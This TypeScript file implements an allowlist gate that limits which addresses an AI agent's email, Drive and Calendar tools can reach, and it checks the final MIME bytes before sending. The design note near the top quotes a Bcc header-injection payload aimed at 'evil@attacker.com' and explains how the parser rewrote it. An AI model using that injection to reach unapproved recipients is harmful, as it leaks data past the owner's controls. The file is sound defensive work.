// Hard send boundary.
//
// docs/specs/001-email-tool.md: "Any attempt to send to an address not on the list is
// rejected outright, regardless of how the request is phrased or how confident
// the agent is that it's fine." This is enforced by the tool, not by the
// agent's judgment, and not by anything a conversation can talk its way past.
//
// DESIGN NOTE -- why this gate reads raw MIME instead of the caller's arguments.
//
// A critic pass on the compose layer demonstrated a live parser-differential
// attack: `to: 'alex@gmail.com\r\nBcc: evil@attacker.com'` was rewritten by
// nodemailer's address parser into RFC 5322 group syntax --
//     To: "alex@gmail.com Bcc":evil@attacker.com;
// -- where the intended recipient is demoted to a display name and the attacker
// is the ONLY real recipient. An allowlist that checked the caller's `to` string
// would have read "alex@gmail.com" and waved it through while the message went
// somewhere else entirely.
//
// The compose layer now rejects that input, but defending only there means the
// boundary depends on two parsers agreeing forever. So this gate parses the
// FINAL message bytes -- the same bytes handed to the Gmail API -- and derives
// recipients from the actual header block. There is no representation gap left
// between what is checked and what is sent.
//
// The config lives OUTSIDE the git repo (alongside accounts.json) and the
// filename is fixed, not configurable. Nothing the agent can edit -- repo files,
// git history, tool arguments -- can widen the boundary.

import { promises as fs } from 'node:fs';
import path from 'node:path';

export const ALLOWLIST_FILENAME = 'send-allowlist.json';
export const AUDIT_LOG_FILENAME = 'send-audit.log';

export class SendNotAllowedError extends Error {
  readonly rejected: string[];
  readonly allowed: string[];

  constructor(
    rejected: string[],
    allowed: string[],
    workaround = 'create a draft instead and send it manually from Gmail',
    /**
     * What did NOT happen, in the vocabulary of the tool that was refused.
     * The default is the mail sentence and must stay byte-identical: the
     * mail path's refusal text is part of what the owner-run send
     * verification looked at. Calendar passes its own so an agent asked to
     * invite someone reads "no event was created", not "no message was sent"
     * (plan 002 Phase 5 transcript).
     */
    outcome = 'No message was sent and no send request reached Gmail.'
  ) {
    const plural = rejected.length === 1 ? 'address is' : 'addresses are';
    super(
      `Send blocked: ${rejected.length} recipient ${plural} not on the send allowlist — ` +
        `${rejected.join(', ')}. This server only sends to pre-approved addresses ` +
        `(${allowed.join(', ')}), and the restriction is enforced by the server itself, ` +
        `not by agent judgment — no rephrasing of the request can bypass it. ` +
        `${outcome} ` +
        `To reach a different recipient, ${workaround}.`
    );
    this.name = 'SendNotAllowedError';
    this.rejected = rejected;
    this.allowed = allowed;
  }
}

export class AllowlistConfigError extends Error {
  constructor(message: string) {
    super(
      `Send blocked: the send allowlist could not be read, so sending fails closed. ${message}`
    );
    this.name = 'AllowlistConfigError';
  }
}

/**
 * Reduce an address to the mailbox it actually reaches, so the allowlist cannot
 * be walked around with a cosmetic variant of an approved address.
 *
 * Gmail ignores dots in the local part and everything after a `+`, so
 * `a.l.e.x+anything@gmail.com` and `alex@gmail.com` are the same inbox. Both
 * normalize to the same key, which means a plus-tagged variant of an approved
 * address is correctly ALLOWED -- it still lands in the owner's mailbox.
 *
 * Dot-stripping is deliberately scoped to consumer Gmail. Google Workspace
 * domains (tamu.edu here) do NOT ignore dots, so `a.lex@tamu.edu` is a
 * genuinely different mailbox and must not collapse onto an approved one.
 * Plus-addressing does work on Workspace, so that is stripped for every domain.
 */
export function normalizeAddress(raw: string): string {
  const address = raw.trim().toLowerCase();

  const at = address.lastIndexOf('@');
  if (at <= 0 || at === address.length - 1) {
    // Not a shape we can reason about. Return it unchanged so it fails the
    // membership check rather than normalizing into something that passes.
    return address;
  }

  let local = address.slice(0, at);
  let domain = address.slice(at + 1);

  if (domain === 'googlemail.com') domain = 'gmail.com';

  const plus = local.indexOf('+');
  if (plus !== -1) local = local.slice(0, plus);

  if (domain === 'gmail.com') local = local.split('.').join('');

  return `${local}@${domain}`;
}

/**
 * Read the allowlist. Every failure path denies: missing file, unreadable file,
 * malformed JSON, wrong shape, and an empty list all raise rather than
 * returning an empty set that some later `.has()` would quietly answer false
 * for. The spec is explicit that an empty or misconfigured allowlist fails
 * closed rather than open.
 */
export async function loadAllowlist(
  configRoot: string
): Promise<{ normalized: Set<string>; display: string[] }> {
  const file = path.join(configRoot, ALLOWLIST_FILENAME);

  let text: string;
  try {
    text = await fs.readFile(file, 'utf8');
  } catch (err) {
    throw new AllowlistConfigError(
      `Could not read ${file}: ${(err as Error).message}`
    );
  }

  let parsed: unknown;
  try {
    parsed = JSON.parse(text);
  } catch (err) {
    throw new AllowlistConfigError(
      `${file} is not valid JSON: ${(err as Error).message}`
    );
  }

  const allowed = (parsed as { allowed?: unknown })?.allowed;
  if (!Array.isArray(allowed)) {
    throw new AllowlistConfigError(
      `${file} must contain an "allowed" array of email addresses.`
    );
  }

  const display: string[] = [];
  const normalized = new Set<string>();
  for (const entry of allowed) {
    if (typeof entry !== 'string') {
      throw new AllowlistConfigError(
        `${file} contains a non-string entry in "allowed".`
      );
    }
    const trimmed = entry.trim();
    if (trimmed === '') continue;
    if (!trimmed.includes('@')) {
      throw new AllowlistConfigError(
        `${file} contains an entry that is not an email address: "${trimmed}".`
      );
    }
    display.push(trimmed);
    normalized.add(normalizeAddress(trimmed));
  }

  if (normalized.size === 0) {
    throw new AllowlistConfigError(
      `${file} has an empty "allowed" list, so no send is permitted.`
    );
  }

  return { normalized, display };
}

/**
 * Pull every recipient out of the message that is actually about to be sent.
 *
 * Only the top-level header block is read -- everything from the start of the
 * message to the first blank line. A `To:` line further down lives inside a
 * body part and is content, not a recipient; parsing it would let a crafted
 * body inject phantom entries into the audit trail.
 *
 * Header folding (continuation lines beginning with space or tab) is unfolded
 * first, since a recipient list can legally be split across lines and a
 * line-by-line reader would see only its first fragment.
 */
export function extractRecipients(
  mime: string
): Array<{ field: string; address: string }> {
  const headerEnd = mime.search(/\r?\n\r?\n/);
  const headerBlock = headerEnd === -1 ? mime : mime.slice(0, headerEnd);

  const unfolded = headerBlock.replace(/\r?\n[ \t]+/g, ' ');
  const out: Array<{ field: string; address: string }> = [];

  for (const line of unfolded.split(/\r?\n/)) {
    const colon = line.indexOf(':');
    if (colon === -1) continue;

    const field = line.slice(0, colon).trim().toLowerCase();
    if (field !== 'to' && field !== 'cc' && field !== 'bcc') continue;

    for (const address of splitAddressList(line.slice(colon + 1))) {
      out.push({ field, address });
    }
  }

  return out;
}

/**
 * Split a header value into addresses and reduce each to its bare mailbox.
 *
 * Commas inside quoted display names and inside angle brackets do not separate
 * addresses, so a naive `.split(',')` would shred `"Doe, John" <j@x.com>` into
 * two bogus entries. Anything that looks like an address is emitted -- including
 * the members of RFC 5322 group syntax, which is exactly the construct that made
 * the original attack work. Compose rejects groups outright now; this gate still
 * reports their members so a group can never smuggle a recipient past the check.
 */
function splitAddressList(value: string): string[] {
  const parts: string[] = [];
  let current = '';
  let inQuotes = false;
  let inAngle = false;

  for (let i = 0; i < value.length; i += 1) {
    const ch = value[i];

    if (ch === '\\' && inQuotes) {
      current += ch + (value[i + 1] ?? '');
      i += 1;
      continue;
    }
    if (ch === '"') {
      inQuotes = !inQuotes;
      current += ch;
      continue;
    }
    if (!inQuotes && ch === '<') inAngle = true;
    if (!inQuotes && ch === '>') inAngle = false;

    // `:` opens a group and `;` closes it. Treat both as separators so the
    // group's members are examined individually rather than as one blob.
    if (!inQuotes && !inAngle && (ch === ',' || ch === ':' || ch === ';')) {
      parts.push(current);
      current = '';
      continue;
    }
    current += ch;
  }
  parts.push(current);

  const addresses: string[] = [];
  for (const part of parts) {
    const address = bareAddress(part);
    if (address) addresses.push(address);
  }
  return addresses;
}

function bareAddress(part: string): string | null {
  const trimmed = part.trim();
  if (trimmed === '') return null;

  // `Name <addr>` -- the angle-bracket form wins, since that is the mailbox a
  // mail transfer agent will actually use.
  const angle = trimmed.match(/<([^<>]*)>/);
  const candidate = (angle ? angle[1] : trimmed).trim().replace(/^"|"$/g, '');

  if (!candidate.includes('@')) return null;
  return candidate;
}

export interface AllowlistDecision {
  allowed: boolean;
  recipients: Array<{ field: string; address: string; normalized: string }>;
  rejected: string[];
}

/**
 * The choke point. Call this immediately before handing bytes to the Gmail API
 * and nowhere else -- an earlier check that some later code path trusts is the
 * confused-deputy pattern this boundary exists to prevent.
 *
 * `rawMessage` is the base64url string destined for the Gmail API `raw` field,
 * i.e. the literal bytes that will be sent.
 */
export async function assertSendAllowed(options: {
  rawMessage: string;
  accountId: string;
  configRoot: string;
  /** Overridable only for tests; production always uses the real audit log. */
  auditLogPath?: string;
}): Promise<AllowlistDecision> {
  const { rawMessage, accountId, configRoot } = options;
  const auditLogPath =
    options.auditLogPath ?? path.join(configRoot, AUDIT_LOG_FILENAME);

  // Any failure here throws, so a broken config can never reach the send call.
  const { normalized: allowed, display } = await loadAllowlist(configRoot);

  const mime = Buffer.from(rawMessage, 'base64url').toString('utf8');
  const found = extractRecipients(mime);

  const recipients = found.map((r) => ({
    ...r,
    normalized: normalizeAddress(r.address),
  }));

  // A message with no parseable recipient is not "vacuously fine" -- it means
  // this gate could not tell where it was going, which is a denial.
  if (recipients.length === 0) {
    await appendAudit(auditLogPath, {
      decision: 'DENIED',
      accountId,
      reason: 'no recipients found in the outgoing message headers',
      recipients: [],
    });
    throw new SendNotAllowedError(['(no recipient found)'], display);
  }

  const rejected = [
    ...new Set(
      recipients.filter((r) => !allowed.has(r.normalized)).map((r) => r.address)
    ),
  ];

  await appendAudit(auditLogPath, {
    decision: rejected.length === 0 ? 'ALLOWED' : 'DENIED',
    accountId,
    reason: rejected.length === 0 ? 'all recipients allowlisted' : 'recipient not allowlisted',
    recipients: recipients.map((r) => `${r.field}:${r.address}`),
    rejected,
  });

  if (rejected.length > 0) {
    throw new SendNotAllowedError(rejected, display);
  }

  return { allowed: true, recipients, rejected: [] };
}

/**
 * Same boundary as {@link assertSendAllowed}, for tools that reach an address
 * without building a MIME message first — Drive sharing, Calendar invites.
 * Google emails the target in both cases, so this is a send in every way that
 * matters even though there is no `raw` MIME to parse it out of.
 *
 * Every failure path denies, same as the send gate: a broken or empty
 * allowlist config throws AllowlistConfigError before any address is checked.
 */
export async function assertAddressAllowed(options: {
  addresses: string[];
  accountId: string;
  configRoot: string;
  workaround?: string;
  /** The "what did not happen" sentence for the refusal; see SendNotAllowedError. */
  outcome?: string;
  /** Overridable only for tests; production always uses the real audit log. */
  auditLogPath?: string;
}): Promise<void> {
  const { addresses, accountId, configRoot, workaround, outcome } = options;
  const auditLogPath =
    options.auditLogPath ?? path.join(configRoot, AUDIT_LOG_FILENAME);

  const cleaned = [...new Set(addresses.map((a) => a.trim()).filter((a) => a !== ''))];
  if (cleaned.length === 0) return;

  // Any failure here throws, so a broken config can never reach the API call.
  const { normalized: allowed, display } = await loadAllowlist(configRoot);

  const rejected = cleaned.filter((a) => !allowed.has(normalizeAddress(a)));

  await appendAudit(auditLogPath, {
    decision: rejected.length === 0 ? 'ALLOWED' : 'DENIED',
    accountId,
    reason: rejected.length === 0 ? 'all addresses allowlisted' : 'address not allowlisted',
    recipients: cleaned,
    rejected,
  });

  if (rejected.length > 0) {
    throw new SendNotAllowedError(rejected, display, workaround, outcome);
  }
}

/**
 * Append one JSON line to the audit trail.
 *
 * A logging failure deliberately does NOT change the decision. Denials are the
 * security property and they happen regardless; the log is forensics. Making an
 * unwritable disk block every send would convert a monitoring problem into an
 * outage, so the failure is surfaced on stderr instead.
 */
async function appendAudit(
  logPath: string,
  entry: Record<string, unknown>
): Promise<void> {
  const line = JSON.stringify({ at: new Date().toISOString(), ...entry });
  try {
    await fs.appendFile(logPath, `${line}\n`, 'utf8');
  } catch (err) {
    console.error(
      `[allowlist] AUDIT WRITE FAILED (${(err as Error).message}) for: ${line}`
    );
  }
}
